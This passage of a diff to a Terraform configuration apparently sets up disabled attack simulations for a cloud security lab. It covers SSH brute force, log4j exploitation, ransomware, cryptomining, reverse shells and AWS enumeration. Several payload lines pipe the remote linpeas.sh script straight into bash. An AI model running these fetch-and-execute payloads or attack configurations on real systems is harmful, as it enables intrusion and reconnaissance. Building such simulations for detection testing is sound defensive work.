+                  "aws ec2 describe-vpcs $opts >> $LOGFILE 2>&1",
+                  "x=$(($x-1))",
+                  "done",
+                ]
               }
             }
           }
           attacker = {
+            connect = {
+              ssh_shell_multistage = {
+                enabled = false
+                user_list = "/tmp/hydra-users.txt"
+                password_list = "/tmp/hydra-passwords.txt"
+                attack_delay = 50400
+                payload = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
+                task = "custom"
+                target_ip = null
+                target_port = 22
+                reverse_shell_host = null
+                reverse_shell_port = 4444
+              }
+            }
             listener = {
               http = {
                 enabled                     = false
                 listen_ip                   = "0.0.0.0"
                 listen_port                 = 8080
-              }
-              port_forward = {
-                enabled                     = false
-                port_forwards               = [{
-                                                src_port      = 1234
-                                                dst_port      = 4444
-                                                dst_ip        = "127.0.0.1"
-                                                description   = "Example"
-                                              }]
               }
             }
             responder = {
@@ -1259,16 +1614,17 @@ variable "config" {
                 enabled                     = false
                 listen_ip                   = "0.0.0.0"
                 listen_port                 = "4444"
-                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
               }
               reverse_shell_multistage = {
                 enabled                     = false
                 listen_ip                   = "0.0.0.0"
                 listen_port                 = "4444"
-                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
                 iam2rds_role_name           = "rds_user_access_role_ciemdemo"
                 iam2rds_session_name        = "attacker-session"
                 attack_delay                = 50400
+                reverse_shell_host          = null
               }
               port_forward = {
                 enabled                     = false
@@ -1276,26 +1632,34 @@ variable "config" {
               }
             }
             execute = {
-              vuln_npm_app_attack = {
+              exploit_npm_app = {
                 enabled                     = false
                 target_ip                   = null
                 target_port                 = 8089
-                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
                 attack_delay                = 50400
               }
-              docker_log4shell_attack = {
+              exploit_authapp = {
+                enabled                     = false
+                target_ip                   = null
+                target_port                 = 8000
+                attack_delay                = 50400
+                compromised_user_first_name = null
+                compromised_user_last_name  = null
+              }
+              docker_exploit_log4j_app = {
                 enabled                     = false
                 attacker_http_port          = 8088
                 attacker_ldap_port          = 1389
                 attacker_ip                 = null
                 target_ip                   = null
                 target_port                 = null
-                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
                 reverse_shell               = false
                 reverse_shell_port          = 0
                 attack_delay                =  50400
               },
-              docker_composite_compromised_credentials_attack = {
+              docker_composite_compromised_credentials = {
                 enabled                     = false
                 compromised_credentials     = {}
                 protonvpn_user              = null
@@ -1310,7 +1674,7 @@ variable "config" {
                 compromised_keys_user       = null
                 attack_delay                =  50400
               },
-              docker_composite_cloud_ransomware_attack = {
+              docker_composite_cloud_ransomware = {
                 enabled                     = false
                 compromised_credentials     = {}
                 protonvpn_user              = null
@@ -1325,7 +1689,7 @@ variable "config" {
                 compromised_keys_user       = null
                 attack_delay                =  50400
               },
-              docker_composite_defense_evasion_attack = {
+              docker_composite_defense_evasion = {
                 enabled                     = false
                 compromised_credentials     = {}
                 protonvpn_user              = null
@@ -1340,7 +1704,7 @@ variable "config" {
                 compromised_keys_user       = null
                 attack_delay                =  50400
               },
-              docker_composite_cloud_cryptomining_attack = {
+              docker_composite_cloud_cryptomining = {
                 enabled                     = false
                 compromised_credentials     = {}
                 protonvpn_user              = null
@@ -1355,7 +1719,7 @@ variable "config" {
                 compromised_keys_user       = null
                 attack_delay                =  50400
               },
-              docker_composite_host_cryptomining_attack = {
+              docker_composite_host_cryptomining = {
                 enabled                     = false
                 compromised_credentials     = {}
                 protonvpn_user              = null
@@ -1370,11 +1734,11 @@ variable "config" {
                 compromised_keys_user       = null
                 attack_delay                =  50400
               },
-              docker_composite_guardduty_attack = {
+              docker_composite_guardduty = {
                 enabled                     = false
                 attack_delay                =  50400
               },
-              docker_composite_host_compromise_attack = {
+              docker_composite_host_compromise = {
                 enabled                     = false
                 attack_delay                = 50400
               },
@@ -1406,7 +1770,28 @@ variable "config" {
                 enabled                     = false
                 compromised_credentials     = {}
                 compromised_keys_user       = null
-                commands                    = []
+                profile                     = "aws-traffic"
+                commands                    = [
+                  "x=10",
+                  "opts=\"--output json --color off --no-cli-pager\"",
+                  "while [ $x -gt 0 ]; do ",
+                  "log \"Running: aws sts get-caller-identity $opts\"",
+                  "aws sts get-caller-identity $opts >> $LOGFILE 2>&1",
+                  "log \"Running: aws iam list-users $opts\"",
+                  "aws iam list-users $opts >> $LOGFILE 2>&1",
+                  "log \"Running: aws s3api list-buckets $opts\"",
+                  "aws s3api list-buckets $opts >> $LOGFILE 2>&1",
+                  "log \"Running: aws ec2 describe-instances $opts\"",
+                  "aws ec2 describe-instances $opts >> $LOGFILE 2>&1",
+                  "log \"Running: aws ec2 describe-images --filters \"Name=name,Values=ubuntu-pro-server/images/*20.04*\" $opts\"",
+                  "aws ec2 describe-images --filters \"Name=name,Values=ubuntu-pro-server/images/*20.04*\" $opts >> $LOGFILE 2>&1",
+                  "log \"Running: aws ec2 describe-volumes $opts\"",
+                  "aws ec2 describe-volumes $opts >> $LOGFILE 2>&1",
+                  "log \"Running: aws ec2 describe-vpcs $opts\"",
+                  "aws ec2 describe-vpcs $opts >> $LOGFILE 2>&1",
+                  "x=$(($x-1))",
+                  "done",
+                ]
               }
             }
           }
